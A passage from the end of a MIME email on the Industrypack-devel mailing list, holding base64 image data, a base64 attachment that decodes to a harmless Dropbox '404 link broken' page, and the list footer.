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

------=_NextPart_000_0012_03532FAE.A2825598
Content-Type: application/octet-stream; name="fw4wbhvhum7nunocnesvzb"
Content-Transfer-Encoding: base64
Content-ID: <fw4wbhvhum7nunocnesvzb>

PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD48bWV0YSBodHRwLWVxdWl2PSJDb250ZW50
LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+Cjx0aXRsZT5Ecm9w
Ym94IC0gNDA0PC90aXRsZT4KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZmwuZHJvcGJveHN0YXRp
Yy5jb20vc3RhdGljL2Nzcy9lcnJvci5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4
dC9jc3MiLz4KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwczovL2NmbC5k
cm9wYm94c3RhdGljLmNvbS9zdGF0aWMvaW1hZ2VzL2Zhdmljb24uaWNvIi8+CjwvaGVhZD4K
PGJvZHk+CjxkaXYgY2xhc3M9ImZpZ3VyZSI+CjxpbWcgc3JjPSJodHRwczovL2Fzc2V0cy5k
cm9wYm94LmNvbS93d3cvZW4tdXMvaWxsdXN0cmF0aW9ucy9zcG90L2xpbmstYnJva2VuLnN2
ZyIgYWx0PSJFcnJvcjogNDA0Ii8+CjwvZGl2Pgo8ZGl2IGlkPSJlcnJvcmJveCI+CjxkaXYg
Y2xhc3M9Im5vdC1mb3VuZCI+IDxoMT5UaGlzIGxpbmsgZG9lc24ndCB3b3JrIGFueW1vcmU8
L2gxPiBOZWVkIGhlbHAgZmluZGluZyB3aGF0IHlvdSdyZSBsb29raW5nIGZvcj8gVHJ5IHVz
aW5nIG91ciA8YSBocmVmPSJodHRwczovL3d3dy5kcm9wYm94LmNvbS9oZWxwP190az1mb2Yi
PmhlbHAgY2VudGVyPC9hPiBvciBhc2sgdGhlIDxhIGhyZWY9Imh0dHBzOi8vZm9ydW1zLmRy
b3Bib3guY29tIj5Ecm9wYm94IGNvbW11bml0eTwvYT4uIDwvZGl2Pgo8L2Rpdj4KCjwvYm9k
eT4KPC9odG1sPgo=

------=_NextPart_000_0012_03532FAE.A2825598--



--===============1915509592447386749==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1915509592447386749==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1915509592447386749==--


